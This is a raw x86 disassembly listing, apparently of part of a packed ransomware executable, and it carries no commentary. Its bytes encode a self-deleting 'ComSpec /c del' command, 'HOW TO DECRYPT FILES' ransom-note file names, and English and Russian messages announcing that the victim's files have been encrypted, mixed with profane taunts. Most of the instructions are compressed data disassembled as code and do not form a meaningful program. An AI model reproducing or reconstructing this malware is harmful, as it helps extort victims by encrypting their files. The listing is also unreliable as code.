  4095e3:	e6 61                	out    %al,$0x61
  4095e5:	11 0f                	adc    %ecx,(%edi)
  4095e7:	11 75 18             	adc    %esi,0x18(%ebp)
  4095ea:	12 89 b0 77 26 65    	adc    0x652677b0(%ecx),%cl
  4095f0:	19 25 ff e6 73 02    	sbb    %esp,0x273e6ff
  4095f6:	63 65 c9             	arpl   %esp,-0x37(%ebp)
  4095f9:	6d                   	insl   (%dx),%es:(%edi)
  4095fa:	8a 17                	mov    (%edi),%dl
  4095fc:	47                   	inc    %edi
  4095fd:	38 d0                	cmp    %dl,%al
  4095ff:	75 18                	jne    0x409619
  409601:	e2 1d                	loop   0x409620
  409603:	42                   	inc    %edx
  409604:	4a                   	dec    %edx
  409605:	be f6 bb 12 27       	mov    $0x2712bbf6,%esi
  40960a:	16                   	push   %ss
  40960b:	dd 01                	fldl   (%ecx)
  40960d:	69 d8 43 bb 40 27    	imul   $0x2740bb43,%eax,%ebx
  409613:	ca eb 14             	lret   $0x14eb
  409616:	15 c3 b0 70 24       	adc    $0x2470b0c3,%eax
  40961b:	3c e1                	cmp    $0xe1,%al
  40961d:	3d 83 8a 01 60       	cmp    $0x60018a83,%eax
  409622:	10 2e                	adc    %ch,(%esi)
  409624:	b9 21 a6 01 06       	mov    $0x601a621,%ecx
  409629:	06                   	push   %es
  40962a:	0d ba 85 82 fc       	or     $0xfc8285ba,%eax
  40962f:	a8 9a                	test   $0x9a,%al
  409631:	77 91                	ja     0x4095c4
  409633:	7e 0a                	jle    0x40963f
  409635:	f5                   	cmc
  409636:	b3 3d                	mov    $0x3d,%bl
  409638:	b3 19                	mov    $0x19,%bl
  40963a:	3b 09                	cmp    (%ecx),%ecx
  40963c:	82 00 09             	addb   $0x9,(%eax)
  40963f:	8e dc                	mov    %esp,%ds
  409641:	83 6c 06 63 27       	subl   $0x27,0x63(%esi,%eax,1)
  409646:	7e 78                	jle    0x4096c0
  409648:	a3 7a 09 c7 56       	mov    %eax,0x56c7097a
  40964d:	8e c3                	mov    %ebx,%es
  40964f:	8c 1c 1b             	mov    %ds,(%ebx,%ebx,1)
  409652:	4b                   	dec    %ebx
  409653:	c8 99 d9 47          	enter  $0xd999,$0x47
  409657:	7e f5                	jle    0x40964e
  409659:	05 6a 06 77 14       	add    $0x1477066a,%eax
  40965e:	44                   	inc    %esp
  40965f:	0e                   	push   %cs
  409660:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409661:	eb 1a                	jmp    0x40967d
  409663:	1b 2c 35 86 4c 1c b3 	sbb    -0x4ce3b37a(,%esi,1),%ebp
  40966a:	53                   	push   %ebx
  40966b:	7a f3                	jp     0x409660
  40966d:	e6 8e                	out    %al,$0x8e
  40966f:	f1                   	int1
  409670:	30 46 22             	xor    %al,0x22(%esi)
  409673:	68 62 2c 19 68       	push   $0x68192c62
  409678:	af                   	scas   %es:(%edi),%eax
  409679:	ec                   	in     (%dx),%al
  40967a:	3d c8 f3 32 6a       	cmp    $0x6a32f3c8,%eax
  40967f:	05 26 dc a3 6e       	add    $0x6ea3dc26,%eax
  409684:	29 31                	sub    %esi,(%ecx)
  409686:	cf                   	iret
  409687:	dd 45 8e             	fldl   -0x72(%ebp)
  40968a:	f6 2c 32             	imulb  (%edx,%esi,1)
  40968d:	68 b9 35 31 08       	push   $0x83135b9
  409692:	03 64 92 29          	add    0x29(%edx,%edx,4),%esp
  409696:	76 eb                	jbe    0x409683
  409698:	6c                   	insb   (%dx),%es:(%edi)
  409699:	a3 f0 3e 6a 17       	mov    %eax,0x176a3ef0
  40969e:	68 1d 3b 31 fe       	push   $0xfe313b1d
  4096a3:	4b                   	dec    %ebx
  4096a4:	31 1f                	xor    %ebx,(%edi)
  4096a6:	16                   	push   %ss
  4096a7:	40                   	inc    %eax
  4096a8:	1e                   	push   %ds
  4096a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4096aa:	a3 6a e4 1f 68       	mov    %eax,0x681fe46a
  4096af:	f5                   	cmc
  4096b0:	1e                   	push   %ds
  4096b1:	32 c8                	xor    %al,%cl
  4096b3:	65 6c                	gs insb (%dx),%es:(%edi)
  4096b5:	f0 2d eb 1d c0 26    	lock sub $0x26c01deb,%eax
  4096bb:	3b c0                	cmp    %eax,%eax
  4096bd:	1e                   	push   %ds
  4096be:	33 8b 72 59 1e c9    	xor    -0x36e1a68e(%ebx),%ecx
  4096c4:	09 30                	or     %esi,(%eax)
  4096c6:	c3                   	ret
  4096c7:	61                   	popa
  4096c8:	eb 4e                	jmp    0x409718
  4096ca:	0d c6 a5 1b af       	or     $0xaf1ba5c6,%eax
  4096cf:	0f 75 20             	pcmpeqw (%eax),%mm4
  4096d2:	58                   	pop    %eax
  4096d3:	bc 50 98 da dc       	mov    $0xdcda9850,%esp
  4096d8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4096d9:	d2 80 0b f2 da 64    	rolb   %cl,0x64daf20b(%eax)
  4096df:	eb 28                	jmp    0x409709
  4096e1:	25 0c 16 8c 0d       	and    $0xd8c160c,%eax
  4096e6:	bc 0f 1a 14 13       	mov    $0x13141a0f,%esp
  4096eb:	9b                   	fwait
  4096ec:	a9 84 dc 02 75       	test   $0x7502dc84,%eax
  4096f1:	0d ec 02 10 3d       	or     $0x3d1002ec,%eax
  4096f6:	48                   	dec    %eax
  4096f7:	83 2d 0c 40 e6 a3 d1 	subl   $0xffffffd1,0xa3e6400c
  4096fe:	6d                   	insl   (%dx),%es:(%edi)
  4096ff:	0c b3                	or     $0xb3,%al
  409701:	6d                   	insl   (%dx),%es:(%edi)
  409702:	77 b0                	ja     0x4096b4
  409704:	02 08                	add    (%eax),%cl
  409706:	ae                   	scas   %es:(%edi),%al
  409707:	29 45 0c             	sub    %eax,0xc(%ebp)
  40970a:	05 0c 15 08 2d       	add    $0x2d08150c,%eax
  40970f:	db 36                	(bad) (%esi)
  409711:	ac                   	lods   %ds:(%esi),%al
  409712:	e3 2c                	jecxz  0x409740
  409714:	20 02                	and    %al,(%edx)
  409716:	1c 18                	sbb    $0x18,%al
  409718:	f0 2b b9 92 3e 1f 07 	lock sub 0x71f3e92(%ecx),%edi
  40971f:	d8 38                	fdivrs (%eax)
  409721:	44                   	inc    %esp
  409722:	25 5b 2b 09 65       	and    $0x65092b5b,%eax
  409727:	2c 37                	sub    $0x37,%al
  409729:	1c 8c                	sbb    $0x8c,%al
  40972b:	bd 06 36 0c 3a       	mov    $0x3a0c3606,%ebp
  409730:	76 37                	jbe    0x409769
  409732:	3d 52 72 14 d6       	cmp    $0xd6147252,%eax
  409737:	6a 34                	push   $0x34
  409739:	44                   	inc    %esp
  40973a:	7c 9d                	jl     0x4096d9
  40973c:	fa                   	cli
  40973d:	b6 5b                	mov    $0x5b,%dh
  40973f:	f8                   	clc
  409740:	1d f0 a2 95 fc       	sbb    $0xfc95a2f0,%eax
  409745:	7f 05                	jg     0x40974c
  409747:	b8 f9 16 24 7e       	mov    $0x7e2416f9,%eax
  40974c:	4f                   	dec    %edi
  40974d:	8d ab 15 68 03 80    	lea    -0x7ffc97eb(%ebx),%ebp
  409753:	04 f7                	add    $0xf7,%al
  409755:	7c 0f                	jl     0x409766
  409757:	84 fc                	test   %bh,%ah
  409759:	19 2a                	sbb    %ebp,(%edx)
  40975b:	35 6a 01 05 f7       	xor    $0xf705016a,%eax
  409760:	3d 5b 14 f8 3c       	cmp    $0x3cf8145b,%eax
  409765:	39 14 61             	cmp    %edx,(%ecx,%eiz,2)
  409768:	7d 87                	jge    0x4096f1
  40976a:	1d 6c b0 02 12       	sbb    $0x1202b06c,%eax
  40976f:	36 07                	ss pop %es
  409771:	30 6a 39             	xor    %ch,0x39(%edx)
  409774:	42                   	inc    %edx
  409775:	80 05 38 59 cd f0 53 	addb   $0x53,0xf0cd5938
  40977c:	ed                   	in     (%dx),%eax
  40977d:	0e                   	push   %cs
  40977e:	30 e0                	xor    %ah,%al
  409780:	43                   	inc    %ebx
  409781:	c9                   	leave
  409782:	3a 2e                	cmp    (%esi),%ch
  409784:	13 2c 3d 16 32 60 96 	adc    -0x699fcdea(,%edi,1),%ebp
  40978b:	13 40 15             	adc    0x15(%eax),%eax
  40978e:	30 d9                	xor    %bl,%cl
  409790:	32 60 43             	xor    0x43(%eax),%ah
  409793:	11 fc                	adc    %edi,%esp
  409795:	19 d0                	sbb    %edx,%eax
  409797:	58                   	pop    %eax
  409798:	68 c9 fb 57 ba       	push   $0xba57fbc9
  40979d:	bd 9f 7e bb d1       	mov    $0xd1bb7e9f,%ebp
  4097a2:	d6                   	salc
  4097a3:	cc                   	int3
  4097a4:	10 8b 3c 83 e8 10    	adc    %cl,0x10e8833c(%ebx)
  4097aa:	50                   	push   %eax
  4097ab:	57                   	push   %edi
  4097ac:	f4                   	hlt
  4097ad:	17                   	pop    %ss
  4097ae:	8b 7b dd             	mov    -0x23(%ebx),%edi
  4097b1:	9a a3 1f de 77 b1 35 	lcall  $0x35b1,$0x77de1fa3
  4097b8:	b5 2f                	mov    $0x2f,%ch
  4097ba:	3d 6b 3f 9a a4       	cmp    $0xa49a3f6b,%eax
  4097bf:	b8 a3 ff 53 57       	mov    $0x5753ffa3,%eax
  4097c4:	1a 07                	sbb    (%edi),%al
  4097c6:	90                   	nop
  4097c7:	89 ec                	mov    %ebp,%esp
  4097c9:	d8 3d 03 fb 2f 1d    	fdivrs 0x1d2ffb03
  4097cf:	19 64 08 64          	sbb    %esp,0x64(%eax,%ecx,1)
  4097d3:	1d 21 21 95 02       	sbb    $0x2952121,%eax
  4097d8:	f2 2d ac c9 3c 03    	repnz sub $0x33cc9ac,%eax
  4097de:	f9                   	stc
  4097df:	26 b9 0f 29 75 05    	es mov $0x575290f,%ecx
  4097e5:	1f                   	pop    %ds
  4097e6:	d9 25 cb 81 74 2f    	fldenv 0x2f7481cb
  4097ec:	e9 04 25 21 b9       	jmp    0xb961bcf5
  4097f1:	90                   	nop
  4097f2:	df 04 0f             	filds  (%edi,%ecx,1)
  4097f5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4097f6:	65 a9 20 48 10 90    	gs test $0x90104820,%eax
  4097fc:	ad                   	lods   %ds:(%esi),%eax
  4097fd:	03 d0                	add    %eax,%edx
  4097ff:	8b c3                	mov    %ebx,%eax
  409801:	11 a3 60 bb 38 6d    	adc    %esp,0x6d38bb60(%ebx)
  409807:	42                   	inc    %edx
  409808:	8f                   	(bad)
  409809:	0b dd                	or     %ebp,%ebx
  40980b:	c6                   	(bad)
  40980c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40980f:	e0 75                	loopne 0x409886
  409811:	04 c2                	add    $0xc2,%al
  409813:	d1 6f e1             	shrl   $1,-0x1f(%edi)
  409816:	37                   	aaa
  409817:	0a ae 04 1a aa 42    	or     0x42aa1a04(%esi),%ch
  40981d:	49                   	dec    %ecx
  40981e:	89 61 14             	mov    %esp,0x14(%ecx)
  409821:	ff                   	(bad)
  409822:	ff                   	(bad)
  409823:	ff 5b 88             	lcall  *-0x78(%ebx)
  409826:	43                   	inc    %ebx
  409827:	6f                   	outsl  %ds:(%esi),(%dx)
  409828:	6d                   	insl   (%dx),%es:(%edi)
  409829:	53                   	push   %ebx
  40982a:	70 65                	jo     0x409891
  40982c:	63 00                	arpl   %eax,(%eax)
  40982e:	2f                   	das
  40982f:	63 20                	arpl   %esp,(%eax)
  409831:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  409834:	20 22                	and    %ah,(%edx)
  409836:	00 22                	add    %ah,(%edx)
  409838:	20 3e                	and    %bh,(%esi)
  40983a:	3e 20 4e 55          	and    %cl,%ds:0x55(%esi)
  40983e:	4c                   	dec    %esp
  40983f:	d9 8e 85 19 c9 85    	(bad) -0x7a36e67b(%esi)
  409845:	66 d3 4d 21          	rorw   %cl,0x21(%ebp)
  409849:	6d                   	insl   (%dx),%es:(%edi)
  40984a:	d9 24 9b             	fldenv (%ebx,%ebx,4)
  40984d:	fa                   	cli
  40984e:	76 68                	jbe    0x4098b8
  409850:	55                   	push   %ebp
  409851:	21 de                	and    %ebx,%esi
  409853:	b9 68 54 0e 63       	mov    $0x630e5468,%ecx
  409858:	60                   	pusha
  409859:	17                   	pop    %ss
  40985a:	60                   	pusha
  40985b:	62 5e 21             	bound  %ebx,0x21(%esi)
  40985e:	0e                   	push   %cs
  40985f:	6f                   	outsl  %ds:(%esi),(%dx)
  409860:	c2 ef cd             	ret    $0xcdef
  409863:	de 0d 44 0d 34 1e    	fimuls 0x1e340d44
  409869:	c3                   	ret
  40986a:	3c 84                	cmp    $0x84,%al
  40986c:	df ef                	fucomip %st(7),%st
  40986e:	63 aa 80 10 54 c3    	arpl   %ebp,-0x3cabef80(%edx)
  409874:	2d a0 a3 6c b0       	sub    $0xb06ca3a0,%eax
  409879:	60                   	pusha
  40987a:	6b 15 bb 55 4e ad b3 	imul   $0xffffffb3,0xad4e55bb,%edx
  409881:	05 3b 36 0e 50       	add    $0x500e363b,%eax
  409886:	59                   	pop    %ecx
  409887:	73 96                	jae    0x40981f
  409889:	05 61 52 67 3c       	add    $0x3c675261,%eax
  40988e:	78 4b                	js     0x4098db
  409890:	94                   	xchg   %eax,%esp
  409891:	c0 ae 1e c6 a3 09 a3 	shrb   $0xa3,0x9a3c61e(%esi)
  409898:	80 40 07 b0          	addb   $0xb0,0x7(%eax)
  40989c:	ed                   	in     (%dx),%eax
  40989d:	92                   	xchg   %eax,%edx
  40989e:	1d 9e 24 6e 82       	sbb    $0x826e249e,%eax
  4098a3:	46                   	inc    %esi
  4098a4:	ab                   	stos   %eax,%es:(%edi)
  4098a5:	3c 40                	cmp    $0x40,%al
  4098a7:	30 7b a5             	xor    %bh,-0x5b(%ebx)
  4098aa:	81 0e 33 0b 57 e4    	orl    $0xe4570b33,(%esi)
  4098b0:	21 0e                	and    %ecx,(%esi)
  4098b2:	f2 f1                	repnz int1
  4098b4:	40                   	inc    %eax
  4098b5:	09 6b dc             	or     %ebp,-0x24(%ebx)
  4098b8:	03 40 88             	add    -0x78(%eax),%eax
  4098bb:	80 9c 50 59 b8 4c 3c 	sbbb   $0x5a,0x3c4cb859(%eax,%edx,2)
  4098c2:	5a 
  4098c3:	0d 05 0e c6 be       	or     $0xbec60e05,%eax
  4098c8:	ee                   	out    %al,(%dx)
  4098c9:	74 cf                	je     0x40989a
  4098cb:	63 d4                	arpl   %edx,%esp
  4098cd:	43                   	inc    %ebx
  4098ce:	04 a6                	add    $0xa6,%al
  4098d0:	e2 80                	loop   0x409852
  4098d2:	9c                   	pushf
  4098d3:	1e                   	push   %ds
  4098d4:	04 32                	add    $0x32,%al
  4098d6:	16                   	push   %ss
  4098d7:	ec                   	in     (%dx),%al
  4098d8:	04 13                	add    $0x13,%al
  4098da:	3e 26 00 41 b6       	ds add %al,%es:-0x4a(%ecx)
  4098df:	06                   	push   %es
  4098e0:	0f e8 d0             	psubsb %mm0,%mm2
  4098e3:	ec                   	in     (%dx),%al
  4098e4:	b3 89                	mov    $0x89,%bl
  4098e6:	59                   	pop    %ecx
  4098e7:	de 08                	fimuls (%eax)
  4098e9:	10 ac b2 ff cf b9 15 	adc    %ch,0x15b9cfff(%edx,%esi,4)
  4098f0:	30 2c 3b             	xor    %ch,(%ebx,%edi,1)
  4098f3:	1c 52                	sbb    $0x52,%al
  4098f5:	90                   	nop
  4098f6:	0f 1b b3 37 7b f0 9d 	bndstx (bad),-0x620f84c9(%ebx)
  4098fd:	00 13                	add    %dl,(%ebx)
  4098ff:	f7 a6 bd 84 3c ec    	mull   -0x13c37b43(%esi)
  409905:	68 ea 43 18 e9       	push   $0xe91843ea
  40990a:	6d                   	insl   (%dx),%es:(%edi)
  40990b:	0e                   	push   %cs
  40990c:	9c                   	pushf
  40990d:	b0 05                	mov    $0x5,%al
  40990f:	96                   	xchg   %eax,%esi
  409910:	50                   	push   %eax
  409911:	11 43 4f             	adc    %eax,0x4f(%ebx)
  409914:	a3 43 6c 65 2f       	mov    %eax,0x2f656c43
  409919:	21 7a 09             	and    %edi,0x9(%edx)
  40991c:	5e                   	pop    %esi
  40991d:	45                   	inc    %ebp
  40991e:	1f                   	pop    %ds
  40991f:	c6 42 ae 8d          	movb   $0x8d,-0x52(%edx)
  409923:	02 12                	add    (%edx),%dl
  409925:	c6 80 13 98 c2 ba 4e 	movb   $0x4e,-0x453d67ed(%eax)
  40992c:	0a 00                	or     (%eax),%al
  40992e:	47                   	inc    %edi
  40992f:	c3                   	ret
  409930:	0c ce                	or     $0xce,%al
  409932:	f1                   	int1
  409933:	ac                   	lods   %ds:(%esi),%al
  409934:	03 01                	add    (%ecx),%eax
  409936:	f7 68 1f             	imull  0x1f(%eax)
  409939:	4d                   	dec    %ebp
  40993a:	06                   	push   %es
  40993b:	06                   	push   %es
  40993c:	be 61 b9 79 50       	mov    $0x5079b961,%esi
  409941:	ef                   	out    %eax,(%dx)
  409942:	49                   	dec    %ecx
  409943:	4e                   	dec    %esi
  409944:	53                   	push   %ebx
  409945:	0e                   	push   %cs
  409946:	1c 70                	sbb    $0x70,%al
  409948:	63 51 50             	arpl   %edx,0x50(%ecx)
  40994b:	08 36                	or     %dh,(%esi)
  40994d:	d0 26                	shlb   $1,(%esi)
  40994f:	6b b0 b3 ec 5a 07 48 	imul   $0x48,0x75aecb3(%eax),%esi
  409956:	ea fc 37 1b a4 93 10 	ljmp   $0x1093,$0xa41b37fc
  40995d:	5e                   	pop    %esi
  40995e:	a9 ac 09 a8 26       	test   $0x26a809ac,%eax
  409963:	e3 b0                	jecxz  0x409915
  409965:	73 60                	jae    0x4099c7
  409967:	68 dd 18 fa 31       	push   $0x31fa18dd
  40996c:	01 23                	add    %esp,(%ebx)
  40996e:	5c                   	pop    %esp
  40996f:	93                   	xchg   %eax,%ebx
  409970:	c5 92 18 46 da de    	lds    -0x2125b9e8(%edx),%edx
  409976:	0d f6 80 23 fc       	or     $0xfc2380f6,%eax
  40997b:	a0 07 3a 19 d9       	mov    0xd9193a07,%al
  409980:	da 2f                	fisubrl (%edi)
  409982:	c1 cc ff             	ror    $0xff,%esp
  409985:	25 30 31 18 05       	and    $0x5183130,%eax
  40998a:	2c 28                	sub    $0x28,%al
  40998c:	19 19                	sbb    %ebx,(%ecx)
  40998e:	19 19                	sbb    %ebx,(%ecx)
  409990:	24 10                	and    $0x10,%al
  409992:	0c 08                	or     $0x8,%al
  409994:	1c 19                	sbb    $0x19,%al
  409996:	19 19                	sbb    %ebx,(%ecx)
  409998:	04 00                	add    $0x0,%al
  40999a:	20 f8                	and    %bh,%al
  40999c:	30 e4                	xor    %ah,%ah
  40999e:	39 32                	cmp    %esi,(%edx)
  4099a0:	f2 f4                	repnz hlt
  4099a2:	fc                   	cld
  4099a3:	14 31                	adc    $0x31,%al
  4099a5:	18 c8                	sbb    %cl,%al
  4099a7:	c8 73 64 1c          	enter  $0x6473,$0x1c
  4099ab:	40                   	inc    %eax
  4099ac:	30 44 48 c8          	xor    %al,-0x38(%eax,%ecx,2)
  4099b0:	c8 c8 c8 4c          	enter  $0xc8c8,$0x4c
  4099b4:	50                   	push   %eax
  4099b5:	54                   	push   %esp
  4099b6:	58                   	pop    %eax
  4099b7:	c8 c8 c8 c8          	enter  $0xc8c8,$0xc8
  4099bb:	5c                   	pop    %esp
  4099bc:	60                   	pusha
  4099bd:	64 68 c8 c8 c8 c8    	fs push $0xc8c8c8c8
  4099c3:	6c                   	insb   (%dx),%es:(%edi)
  4099c4:	70 74                	jo     0x409a3a
  4099c6:	78 c8                	js     0x409990
  4099c8:	c8 c8 c8 7c          	enter  $0xc8c8,$0x7c
  4099cc:	80 84 88 c8 c8 c8 c8 	addb   $0x8c,-0x37373738(%eax,%ecx,4)
  4099d3:	8c 
  4099d4:	90                   	nop
  4099d5:	94                   	xchg   %eax,%esp
  4099d6:	98                   	cwtl
  4099d7:	c8 c8 c8 c8          	enter  $0xc8c8,$0xc8
  4099db:	9c                   	pushf
  4099dc:	a0 a4 a8 c8 c8       	mov    0xc8c8a8a4,%al
  4099e1:	c8 c8 ac b0          	enter  $0xacc8,$0xb0
  4099e5:	b4 b8                	mov    $0xb8,%ah
  4099e7:	c8 c8 c8 c8          	enter  $0xc8c8,$0xc8
  4099eb:	bc c0 c4 c8 c8       	mov    $0xc8c8c4c0,%esp
  4099f0:	c8 c8 c8 cc          	enter  $0xc8c8,$0xcc
  4099f4:	3c d8                	cmp    $0xd8,%al
  4099f6:	d4 c8                	aam    $0xc8
  4099f8:	c8 c8 c8 18          	enter  $0xc8c8,$0x18
  4099fc:	04 08                	add    $0x8,%al
  4099fe:	0c c8                	or     $0xc8,%al
  409a00:	c8 c8 c8 24          	enter  $0xc8c8,$0x24
  409a04:	20 1c 00             	and    %bl,(%eax,%eax,1)
  409a07:	c8 c8 c8 c8          	enter  $0xc8c8,$0xc8
  409a0b:	14 10                	adc    $0x10,%al
  409a0d:	e8 e4 cc c8 c8       	call   0xc90966f6
  409a12:	c8 e0 ec 34          	enter  $0xece0,$0x34
  409a16:	2c 36                	sub    $0x36,%al
  409a18:	02 08                	add    (%eax),%cl
  409a1a:	c0 00 05             	rolb   $0x5,(%eax)
  409a1d:	ff 47 51             	incl   0x51(%edi)
  409a20:	01 30                	add    %esi,(%eax)
  409a22:	70 33                	jo     0x409a57
  409a24:	6e                   	outsb  %ds:(%esi),(%dx)
  409a25:	53                   	push   %ebx
  409a26:	4f                   	dec    %edi
  409a27:	75 72                	jne    0x409a9b
  409a29:	63 ff                	arpl   %edi,%edi
  409a2b:	f2 ff                	repnz (bad)
  409a2d:	ff 33                	push   (%ebx)
  409a2f:	20 58 30             	and    %bl,0x30(%eax)
  409a32:	72 31                	jb     0x409a65
  409a34:	35 37 2c 20 6d       	xor    $0x6d202c37,%eax
  409a39:	6f                   	outsl  %ds:(%esi),(%dx)
  409a3a:	74 68                	je     0x409aa4
  409a3c:	65 72 66             	gs jb  0x409aa5
  409a3f:	75 63                	jne    0x409aa4
  409a41:	6b 21 00             	imul   $0x0,(%ecx),%esp
  409a44:	70 75                	jo     0x409abb
  409a46:	73 73                	jae    0x409abb
  409a48:	79 be                	jns    0x409a08
  409a4a:	b5 f6                	mov    $0xf6,%ch
  409a4c:	df 6c 69 0c          	fildll 0xc(%ecx,%ebp,2)
  409a50:	00 2e                	add    %ch,(%esi)
  409a52:	62 6d 70             	bound  %ebp,0x70(%ebp)
  409a55:	04 01                	add    $0x1,%al
  409a57:	02 6f 70             	add    0x70(%edi),%ch
  409a5a:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a5c:	ff                   	(bad)
  409a5d:	ff                   	(bad)
  409a5e:	ff                   	lcall  (bad)
  409a5f:	df 07                	filds  (%edi)
  409a61:	65 78 65             	gs js  0x409ac9
  409a64:	00 2a                	add    %ch,(%edx)
  409a66:	00 ca                	add    %cl,%dl
  409a68:	c0 ca 20             	ror    $0x20,%dl
  409a6b:	d0 c0                	rol    $1,%al
  409a6d:	d1 d8                	rcr    $1,%eax
  409a6f:	c8 d4 d0 ce          	enter  $0xd0d4,$0xce
  409a73:	c2 c0 d2             	ret    $0xd2c0
  409a76:	dc 20                	fsubl  (%eax)
  409a78:	d4 c0                	aam    $0xc0
  409a7a:	c9                   	leave
  409a7b:	cb                   	lret
  409a7c:	db b1 ff ff ff 2e    	(bad) 0x2effffff(%ecx)
  409a82:	74 78                	je     0x409afc
  409a84:	74 00                	je     0x409a86
  409a86:	48                   	dec    %eax
  409a87:	4f                   	dec    %edi
  409a88:	57                   	push   %edi
  409a89:	20 54 4f 20          	and    %dl,0x20(%edi,%ecx,2)
  409a8d:	44                   	inc    %esp
  409a8e:	45                   	inc    %ebp
  409a8f:	43                   	inc    %ebx
  409a90:	52                   	push   %edx
  409a91:	59                   	pop    %ecx
  409a92:	50                   	push   %eax
  409a93:	54                   	push   %esp
  409a94:	20 46 49             	and    %al,0x49(%esi)
  409a97:	4c                   	dec    %esp
  409a98:	45                   	inc    %ebp
  409a99:	53                   	push   %ebx
  409a9a:	18 db                	sbb    %bl,%bl
  409a9c:	ff                   	(bad)
  409a9d:	ff                   	(bad)
  409a9e:	ff d4                	call   *%esp
  409aa0:	e0 e9                	loopne 0x409a8b
  409aa2:	eb fb                	jmp    0x409a9f
  409aa4:	20 f3                	and    %dh,%bl
  409aa6:	f1                   	int1
  409aa7:	ef                   	out    %eax,(%dx)
  409aa8:	e5 f8                	in     $0xf8,%eax
  409aaa:	ed                   	in     (%dx),%eax
  409aab:	ee                   	out    %al,(%dx)
  409aac:	20 f0                	and    %dh,%al
  409aae:	e0 f1                	loopne 0x409aa1
  409ab0:	f8                   	clc
  409ab1:	e8 f4 f0 ee e2       	call   0xe32f8baa
  409ab6:	e0 ed                	loopne 0x409aa5
  409ab8:	fb                   	sti
  409ab9:	71 46                	jno    0x409b01
  409abb:	97                   	xchg   %eax,%edi
  409abc:	80 f6 ff             	xor    $0xff,%dh
  409abf:	69 6c 65 73 20 68 61 	imul   $0x76616820,0x73(%ebp,%eiz,2),%ebp
  409ac6:	76 
  409ac7:	65 20 62 65          	and    %ah,%gs:0x65(%edx)
  409acb:	66 4a                	dec    %dx
  409acd:	63 72 ed             	arpl   %esi,-0x13(%edx)
  409ad0:	6d                   	insl   (%dx),%es:(%edi)
  409ad1:	db fe                	(bad)
  409ad3:	79 70                	jns    0x409b45
  409ad5:	74 65                	je     0x409b3c
  409ad7:	64 20 73 93          	and    %dh,%fs:-0x6d(%ebx)
  409adb:	63 1a                	arpl   %ebx,(%edx)
  409add:	73 9a                	jae    0x409a79
  409adf:	6c                   	insb   (%dx),%es:(%edi)
  409ae0:	6c                   	insb   (%dx),%es:(%edi)
  409ae1:	79 27                	jns    0x409b0a
  409ae3:	b7 dd                	mov    $0xdd,%bh
  409ae5:	b7 b7                	mov    $0xb7,%bh
  409ae7:	ce                   	into
  409ae8:	33 e1                	xor    %ecx,%esp
  409aea:	ea e0 07 45 72 72 6f 	ljmp   $0x6f72,$0x724507e0
  409af1:	a8 cf                	test   $0xcf,%al
  409af3:	e0 40                	loopne 0x409b35
  409af5:	eb fc                	jmp    0x409af3
  409af7:	76 6b                	jbe    0x409b64
  409af9:	db ff                	(bad)
  409afb:	20 e2                	and    %ah,%dl
  409afd:	e2 e5                	loop   0x409ae4
  409aff:	e4 e5                	in     $0xe5,%al
  409b01:	ed                   	in     (%dx),%eax
  409b02:	20 ed                	and    %ch,%ch
  409b04:	e5 07                	in     $0x7,%eax
  409b06:	f0 5a                	lock pop %edx
  409b08:	16                   	push   %ss
  409b09:	50                   	push   %eax
  409b0a:	61                   	popa
  409b0b:	30 6d 7b             	xor    %ch,0x7b(%ebp)
  409b0e:	db da                	fcmovnu %st(2),%st
  409b10:	77 1f                	ja     0x409b31
  409b12:	3c 69                	cmp    $0x69,%al
  409b14:	53                   	push   %ebx
  409b15:	69 6e 63 09 72 4e 76 	imul   $0x764e7209,0x63(%esi),%ebp
  409b1c:	fb                   	sti
  409b1d:	db b7 74 16 c2 ed    	(bad) -0x123de98c(%edi)
  409b23:	e8 ec 6d e8 e5       	call   0xe6290914
  409b28:	21 20                	and    %esp,(%eax)
  409b2a:	c2 e0 47             	ret    $0x47e0
  409b2d:	20 f4                	and    %dh,%ah
  409b2f:	8f                   	(bad)
  409b30:	bb ec 2f 3b e7       	mov    $0xe73b2fec,%ebx
  409b35:	e0 86                	loopne 0x409abd
  409b37:	0d 0a c4 eb ff       	or     $0xffebc40a,%eax
  409b3c:	99                   	cltd
  409b3d:	ea 23 6e db ef 7f f2 	ljmp   $0xf27f,$0xefdb6e23
  409b44:	f0 e5 e1             	lock in $0xe1,%eax
  409b47:	f3 e5 f2             	repz in $0xf2,%eax
  409b4a:	f1                   	int1
  409b4b:	ff 63 f1             	jmp    *-0xf(%ebx)
  409b4e:	f2 10 ef             	repnz adc %ch,%bh
  409b51:	1d e2 e8 bb c5       	sbb    $0xc5bbe8e2,%eax
  409b56:	da d6                	fcmovbe %st(6),%st
  409b58:	72 2c                	jb     0x409b86
  409b5a:	e9 0a 7c 56 41       	jmp    0x41971769
  409b5f:	74 a7                	je     0x409b08
  409b61:	5d                   	pop    %ebp
  409b62:	78 db                	js     0x409b3f
  409b64:	7e 6e                	jle    0x409bd4
  409b66:	74 69                	je     0x409bd1
  409b68:	6f                   	outsl  %ds:(%esi),(%dx)
  409b69:	6e                   	outsb  %ds:(%esi),(%dx)
  409b6a:	57                   	push   %edi
  409b6b:	41                   	inc    %ecx
  409b6c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409b6d:	20 79 6f             	and    %bh,0x6f(%ecx)
  409b70:	59                   	pop    %ecx
  409b71:	20 66 2e             	and    %ah,0x2e(%esi)
  409b74:	58                   	pop    %eax
  409b75:	2b 8f cf 77 65 72    	sub    0x726577cf(%edi),%ecx
  409b7b:	1b ca                	sbb    %edx,%ecx
  409b7d:	5e                   	pop    %esi
  409b7e:	da c2                	fcmovb %st(2),%st
  409b80:	6c                   	insb   (%dx),%es:(%edi)
  409b81:	d8 54 6f d9          	fcoms  -0x27(%edi,%ebp,2)
  409b85:	21 78 70             	and    %edi,0x70(%eax)
  409b88:	05 16 ac b5 d7       	add    $0xd7b5ac16,%eax
  409b8d:	ac                   	lods   %ds:(%esi),%al
  409b8e:	24 20                	and    $0x20,%al
  409b90:	35 a9 14 d6 de       	xor    $0xded614a9,%eax
  409b95:	5c                   	pop    %esp
  409b96:	b0 bf                	mov    $0xbf,%al
  409b98:	b2 a0                	mov    $0xa0,%dl
  409b9a:	e8 f1 f7 d5 6b       	call   0x6c169390
  409b9f:	f6 df                	neg    %bh
  409ba1:	de da                	(bad)
  409ba3:	eb 7b                	jmp    0x409c20
  409ba5:	02 ec                	add    %ah,%ch
